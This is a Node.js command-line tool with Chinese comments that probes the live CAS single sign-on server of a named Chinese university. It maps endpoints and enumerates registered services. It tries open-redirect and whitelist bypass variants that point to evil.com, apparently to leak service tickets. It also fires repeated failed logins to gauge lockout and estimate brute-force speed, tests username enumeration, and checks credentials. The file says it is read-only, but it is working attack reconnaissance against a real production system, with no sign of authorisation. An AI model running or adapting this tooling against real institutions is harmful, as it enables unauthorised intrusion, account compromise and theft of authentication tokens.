#!/usr/bin/env node
/**
 * ncwu auth.mjs — 华北水利水电大学 金智统一身份认证 (authserver) 测试工具
 *
 * 仅做只读探测：端点存活、CAS 服务注册表、限流策略、用户名枚举、单次凭据验证。
 * 不含任何字典爆破逻辑。
 *
 *   node auth.mjs probe
 *   node auth.mjs cas
 *   node auth.mjs cas --fuzz
 *   node auth.mjs ratelimit 8888888888 --n 15
 *   node auth.mjs enum
 *   node auth.mjs login <账号> <密码>
 */

const BASE = process.env.BASE || 'https://authserver.ncwu.edu.cn';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const TIMEOUT = 15000;

const cookieJar = new Map();
function jarHeader() {
  return [...cookieJar].map(([k, v]) => `${k}=${v}`).join('; ');
}
function absorb(res) {
  const raw = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
  for (const c of raw) {
    const [pair] = c.split(';');
    const i = pair.indexOf('=');
    if (i > 0) cookieJar.set(pair.slice(0, i).trim(), pair.slice(i + 1).trim());
  }
}

async function req(path, opts = {}) {
  const url = path.startsWith('http') ? path : BASE + path;
  const headers = { 'User-Agent': UA, 'Accept-Language': 'zh-CN,zh;q=0.9', ...(opts.headers || {}) };
  const ck = jarHeader();
  if (ck) headers.Cookie = ck;
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), opts.timeout || TIMEOUT);
  const t0 = Date.now();
  try {
    const res = await fetch(url, { ...opts, headers, signal: ctrl.signal, redirect: 'manual' });
    absorb(res);
    const body = await res.text();
    return { ok: true, status: res.status, body, location: res.headers.get('location') || '', ms: Date.now() - t0 };
  } catch (e) {
    return { ok: false, status: 0, body: '', location: '', ms: Date.now() - t0, err: e.message };
  } finally {
    clearTimeout(timer);
  }
}

/** 取登录页的 CSRF execution token */
async function getExecution() {
  const r = await req('/authserver/login');
  const m = r.body.match(/name="execution"\s+value="([^"]+)"/);
  return { exec: m ? m[1] : '', pageSize: r.body.length, ok: r.ok };
}

/** 提交登录。返回 { ok, status, msg, location } */
async function submitLogin(username, password, extra = {}) {
  const { exec, ok } = await getExecution();
  if (!ok || !exec) return { ok: false, status: 0, msg: '无法获取登录页/execution', location: '' };

  const form = new URLSearchParams({
    username,
    password,
    captcha: '',
    _eventId: 'submit',
    execution: exec,
    ...extra,
  });
  const r = await req('/authserver/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded', Referer: BASE + '/authserver/login' },
    body: form.toString(),
  });

  if (r.status === 302 || r.status === 301) {
    return { ok: true, status: r.status, msg: '[登录成功]', location: r.location };
  }
  const m = r.body.match(/name="error_fm1"[^>]*>([^<]*)</);
  return { ok: r.ok, status: r.status, msg: m ? m[1].trim() : '(无错误提示)', location: r.location };
}

/** CAS serviceValidate：判定 service 是否在注册表中 */
async function validateService(service) {
  const qs = new URLSearchParams({ service, ticket: 'ST-1-probe' });
  const r = await req('/authserver/serviceValidate?' + qs.toString());
  if (!r.ok || r.status !== 200) return { verdict: 'NET', detail: `HTTP ${r.status} ${r.err || ''}` };
  if (/not found in service registry/.test(r.body)) return { verdict: 'REJECT', detail: '未注册' };
  if (/INVALID_TICKET/.test(r.body)) return { verdict: 'ACCEPT', detail: '已注册' };
  if (/INVALID_REQUEST/.test(r.body)) return { verdict: 'INVALID', detail: '参数不完整' };
  const code = (r.body.match(/code='([^']+)'/) || [, '?'])[1];
  return { verdict: 'OTHER', detail: code };
}

const C = { r: '\x1b[31m', g: '\x1b[32m', y: '\x1b[33m', b: '\x1b[36m', d: '\x1b[90m', x: '\x1b[0m' };
const pad = (s, n) => String(s).padEnd(n);

async function cmdProbe() {
  console.log(`${C.b}[probe]${C.x} ${BASE}\n`);
  const paths = [
    '/authserver/login',
    '/authserver/logout',
    '/authserver/serviceValidate',
    '/authserver/p3/serviceValidate',
    '/authserver/proxyValidate',
    '/authserver/samlValidate',
    '/authserver/oauth2.0/authorize',
    '/authserver/oauth2.0/token',
    '/authserver/oauth/login',
    '/authserver/weixin/authlogin',
    '/authserver/getPublicKey',
    '/authserver/checkNeedCaptcha.htl',
    '/authserver/captcha',
    '/authserver/index.do',
    '/authserver/static/',
    '/authserver/../',
  ];
  for (const p of paths) {
    const r = await req(p);
    const tag = !r.ok ? `${C.r}FAIL${C.x}` : r.status === 200 ? `${C.g}200 ${C.x}` : `${C.y}${r.status} ${C.x}`;
    console.log(`  ${tag} ${pad(r.body.length + 'B', 7)} ${pad(r.ms + 'ms', 7)} ${p}${r.location ? C.d + ' -> ' + r.location + C.x : ''}`);
  }
}

async function cmdCas(fuzz) {
  console.log(`${C.b}[cas]${C.x} ServiceManagement 注册表探测\n`);

  const candidates = [
    'https://ehall.ncwu.edu.cn/',
    'https://ehall.ncwu.edu.cn/login',
    'https://my.ncwu.edu.cn/',
    'https://portal.ncwu.edu.cn/',
    'https://oa.ncwu.edu.cn/',
    'https://cas.ncwu.edu.cn/',
    'https://jwmis.ncwu.edu.cn/',
    'https://jwmis.ncwu.edu.cn/hsjw/',
    'https://sso.ncwu.edu.cn/',
    'https://vpn.ncwu.edu.cn/',
    'https://mail.ncwu.edu.cn/',
    'https://lib.ncwu.edu.cn/',
    'https://ids.ncwu.edu.cn/',
    'https://app.ncwu.edu.cn/',
    'https://www.ncwu.edu.cn/',
    'https://xiqueer.ncwu.edu.cn/',
    'https://zwfw.ncwu.edu.cn/',
    'https://hr.ncwu.edu.cn/',
    'https://jwc.ncwu.edu.cn/',
  ];

  const registered = [];
  for (const s of candidates) {
    const v = await validateService(s);
    const tag = v.verdict === 'ACCEPT' ? `${C.r}★ 已注册${C.x}` : v.verdict === 'REJECT' ? `${C.d}  未注册${C.x}` : `${C.y}  ${v.verdict}${C.x}`;
    console.log(`  ${tag}  ${s}  ${C.d}${v.detail}${C.x}`);
    if (v.verdict === 'ACCEPT') registered.push(s);
  }

  if (!registered.length) {
    console.log(`\n${C.y}未发现已注册服务，跳过绕过测试。${C.x}`);
    return;
  }

  console.log(`\n${C.b}[cas]${C.x} 白名单匹配逻辑测试（以 ${registered[0]} 为基准）\n`);
  const base = registered[0];
  const host = new URL(base).host;

  const variants = [
    [base, '基准'],
    [base.replace(/\/$/, ''), '去尾斜杠'],
    [base + 'anything', '路径追加'],
    [base + '../../etc/passwd', '路径穿越'],
    [`https://${host}.evil.com/`, '子域外挂 (host.evil.com)'],
    [`https://${host}@evil.com/`, 'userinfo 混淆 (@evil.com)'],
    [`https://evil.com/?x=${base}`, '★ 反序 contains（token 外泄判定）'],
    [`https://evil.com/#${base}`, '★ fragment 混淆'],
    [`https://evil.com/\\${host}/`, '反斜杠混淆'],
    [`http://${host}/`, '协议降级 http'],
    [`https://${host}:8443/`, '端口篡改'],
    [`https://${host.toUpperCase()}/`, '大小写'],
    [`https://${host}%2eevil.com/`, 'URL 编码点'],
  ];

  for (const [svc, label] of variants) {
    const v = await validateService(svc);
    const hit = v.verdict === 'ACCEPT';
    const mark = hit && label.startsWith('★') ? `${C.r}!! 绕过成立${C.x}` : hit ? `${C.y}放行${C.x}` : `${C.d}拦截${C.x}`;
    console.log(`  ${pad(mark, 22)} ${pad(label, 32)} ${C.d}${svc}${C.x}`);
  }

  if (fuzz) {
    console.log(`\n${C.b}[cas]${C.x} 批量路径 fuzz\n`);
    const paths = ['/login', '/cas', '/sso', '/auth', '/api', '/admin', '/portal', '/home', '/index', '/web', '/app', '/m', '/mobile', '/v2', '/oauth'];
    for (const p of paths) {
      const v = await validateService(`https://${host}${p}`);
      if (v.verdict === 'ACCEPT') console.log(`  ${C.g}命中${C.x} https://${host}${p}`);
    }
  }
}

async function cmdRateLimit(username, n) {
  console.log(`${C.b}[ratelimit]${C.x} 账号 ${username}，连续 ${n} 次失败，观察是否触发锁定/验证码\n`);
  const start = Date.now();
  for (let i = 1; i <= n; i++) {
    const r = await submitLogin(username, `Probe#${i}x${Date.now()}`);
    const captchaShown = /请输入验证码|checkNeedCaptcha|verifyCode/.test(r.msg) ? '验证码介入' : '';
    console.log(`  #${pad(i, 3)} ${pad(r.status, 4)} ${pad(r.ms + 'ms', 8)} ${r.msg} ${captchaShown ? C.r + captchaShown + C.x : ''}`);
    if (/锁定|频繁|稍后|冻结|已停用|超过/.test(r.msg)) {
      console.log(`\n${C.r}>>> 第 ${i} 次触发策略限制：${r.msg}${C.x}`);
      break;
    }
  }
  const avg = ((Date.now() - start) / n).toFixed(0);
  console.log(`\n  平均 ${avg}ms/次，总耗时 ${((Date.now() - start) / 1000).toFixed(1)}s`);
  console.log(`  ${C.d}无锁定/无验证码则可估算理论爆破速率：${(1000 / Number(avg)).toFixed(2)} req/s（单线程）${C.x}`);
}

async function cmdEnum() {
  console.log(`${C.b}[enum]${C.x} 用户名枚举：比对不存在账号与疑似真实账号的响应\n`);
  const samples = [
    ['9999999999', '不可能存在'],
    ['0000000000', '不可能存在'],
    ['2020010101', '疑似真实学号'],
    ['202013401', '疑似真实学号'],
    ['admin', '管理员默认名'],
  ];
  for (const [u, note] of samples) {
    const r = await submitLogin(u, 'Zz123456!');
    console.log(`  ${pad(u, 14)} ${pad(r.status, 4)} ${pad(r.ms + 'ms', 8)} ${pad(r.msg, 24)} ${C.d}${note}${C.x}`);
  }
  console.log(`\n  ${C.d}判定：错误提示与时延均一致 → 无法通过登录响应区分账号是否存在${C.x}`);
}

async function cmdLogin(username, password) {
  console.log(`${C.b}[login]${C.x} 单次验证 ${username}\n`);
  const r = await submitLogin(username, password);
  console.log(`  HTTP ${r.status}  ${r.ms}ms`);
  console.log(`  提示: ${r.msg}`);
  if (r.location) console.log(`  跳转: ${r.location}`);
  console.log(`  会话: ${jarHeader().replace(/=[^;]+/g, '=***')}`);
}

// ---- main ----
const [, , cmd, ...args] = process.argv;
const usage = `用法:
  node auth.mjs probe
  node auth.mjs cas [--fuzz]
  node auth.mjs ratelimit <账号> [次数]
  node auth.mjs enum
  node auth.mjs login <账号> <密码>`;

if (!cmd || cmd === '-h' || cmd === '--help') {
  console.log(usage);
  process.exit(0);
}

const table = {
  probe: () => cmdProbe(),
  cas: () => cmdCas(args.includes('--fuzz')),
  ratelimit: () => cmdRateLimit(args[0] || '8888888888', Number(args[1]) || 10),
  enum: () => cmdEnum(),
  login: () => cmdLogin(args[0] || '', args[1] || ''),
};

const fn = table[cmd];
if (!fn) { console.log(usage); process.exit(1); }

fn().then(() => {
  console.log(`\n${C.d}完成 ${new Date().toLocaleString('zh-CN')}${C.x}`);
}).catch(e => {
  console.error(`${C.r}错误:${C.x} ${e.message}`);
  process.exit(1);
});
